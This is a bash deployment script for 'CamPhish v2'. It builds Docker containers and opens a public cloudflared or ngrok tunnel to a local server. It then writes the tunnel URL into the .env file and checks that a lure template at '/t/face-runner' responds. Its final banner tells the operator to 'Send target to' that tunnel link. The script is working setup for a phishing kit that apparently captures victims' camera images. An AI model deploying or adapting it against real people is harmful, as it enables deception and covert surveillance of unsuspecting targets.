#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_DIR"

TUNNEL="${TUNNEL:-cloudflared}"
ENV_FILE=".env"

echo "=== CamPhish Docker Deployment ==="
echo "Tunnel: $TUNNEL"
echo ""

# ─── helpers ──────────────────────────────────────────────────────────────────

get_access_code() {
    # Prefer persisted file (survives container restarts)
    local code_file="${PROJECT_DIR}/data/.access_code"
    if [ -f "$code_file" ]; then
        local code
        code=$(cat "$code_file")
        if [ -n "$code" ] && [ ${#code} -eq 19 ]; then
            echo "$code"
            return
        fi
    fi
    # Fallback: parse Docker logs
    docker compose logs app 2>/dev/null \
        | grep -oE '[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}' \
        | tail -1
}

wait_healthy() {
    until curl -sf http://localhost:8080/api/health > /dev/null 2>&1; do sleep 2; done
}

# ─── steps ────────────────────────────────────────────────────────────────────

# 0. Build
echo "[0/5] Building Docker image..."
docker compose build app 2>&1 | tail -3
echo "  ✅ Build complete"

# 1. Start core services
echo "[1/5] Starting core services (app + trailbase)..."
docker compose up -d

wait_healthy
ACCESS_CODE=$(get_access_code)
echo "  ✅ App is healthy"
echo "  🔐 Dashboard code: ${ACCESS_CODE:-<check 'docker compose logs app'>}"

# 2. Start tunnel + extract URL
echo "[2/5] Starting $TUNNEL tunnel..."
if [ "$TUNNEL" = "cloudflared" ]; then
    docker compose --profile cloudflared rm -fs cloudflared 2>/dev/null || true
    docker compose --profile cloudflared up -d cloudflared --force-recreate

    echo "  Waiting for tunnel URL from cloudflared..."
    TUNNEL_URL=""
    for i in $(seq 1 60); do
        TUNNEL_URL=$(docker compose logs cloudflared 2>/dev/null \
            | grep -oE 'https://[a-z0-9-]+\.try\.cloudflare\.com' \
            | tail -1)
        if [ -n "$TUNNEL_URL" ]; then
            break
        fi
        sleep 2
    done
    if [ -z "$TUNNEL_URL" ]; then
        echo "  ❌ Failed to get tunnel URL (check: docker compose logs cloudflared)"
        exit 1
    fi
    echo "  ✅ Tunnel URL: $TUNNEL_URL"

elif [ "$TUNNEL" = "ngrok" ]; then
    if [ -z "${NGROK_AUTHTOKEN:-}" ]; then
        echo "  ❌ NGROK_AUTHTOKEN not set (check .env)"
        exit 1
    fi
    docker compose --profile ngrok rm -fs ngrok 2>/dev/null || true
    docker compose --profile ngrok up -d ngrok --force-recreate

    echo "  Waiting for tunnel URL from ngrok..."
    TUNNEL_URL=""
    for i in $(seq 1 60); do
        TUNNEL_URL=$(docker compose logs ngrok 2>/dev/null \
            | grep -oE 'https://[a-zA-Z0-9]+\.ngrok-free\.app|https://[a-zA-Z0-9]+\.ngrok\.io' \
            | tail -1)
        if [ -n "$TUNNEL_URL" ]; then
            break
        fi
        sleep 2
    done
    if [ -z "$TUNNEL_URL" ]; then
        echo "  ❌ Failed to get tunnel URL (check: docker compose logs ngrok)"
        exit 1
    fi
    echo "  ✅ Tunnel URL: $TUNNEL_URL"
fi

# 3. Update CAMPHISH_URL + restart app (picks up new env + generates new code)
echo "[3/5] Updating app with tunnel URL..."

# Strip trailing slash for consistency
TUNNEL_URL="${TUNNEL_URL%/}"
if grep -q "^CAMPHISH_URL=" "$ENV_FILE" 2>/dev/null; then
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' "s|^CAMPHISH_URL=.*|CAMPHISH_URL=$TUNNEL_URL|" "$ENV_FILE"
    else
        sed -i "s|^CAMPHISH_URL=.*|CAMPHISH_URL=$TUNNEL_URL|" "$ENV_FILE"
    fi
elif grep -q "^TUNNEL_LINK=" "$ENV_FILE" 2>/dev/null; then
    if [[ "$OSTYPE" == "darwin"* ]]; then
        sed -i '' "s|^TUNNEL_LINK=.*|TUNNEL_LINK=$TUNNEL_URL|" "$ENV_FILE"
    else
        sed -i "s|^TUNNEL_LINK=.*|TUNNEL_LINK=$TUNNEL_URL|" "$ENV_FILE"
    fi
else
    echo "CAMPHISH_URL=$TUNNEL_URL" >> "$ENV_FILE"
fi

docker compose up -d app --force-recreate

wait_healthy
ACCESS_CODE=$(get_access_code)
echo "  ✅ App restarted with tunnel URL"
echo "  🔐 Dashboard code: ${ACCESS_CODE:-<unknown>}"

# 4. Verify
echo "[4/5] Verifying end-to-end..."
echo "  Health:     $(curl -s http://localhost:8080/api/health | grep -o '"status":"[^"]*"' | head -1)"
echo "  Template:   $(curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/t/face-runner)"
DASH_CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://localhost:8080/?code=${ACCESS_CODE:-}")
echo "  Dashboard:  ${DASH_CODE:-000} (with code)"

# 5. Summary
echo "[5/5] Deployment complete"
echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║              CamPhish v2 Deployment                  ║"
echo "╠══════════════════════════════════════════════════════╣"
echo "║  🎯 Local URL:    http://localhost:8080              ║"
echo "║  🌐 Tunnel URL:   ${TUNNEL_URL}                       "
echo "║  🔐 Dashboard:    http://localhost:8080/?code=${ACCESS_CODE:-<unknown>}   "
echo "║                                                     ║"
echo "║  Send target to:  ${TUNNEL_URL}/t/face-runner        "
echo "╚══════════════════════════════════════════════════════╝"
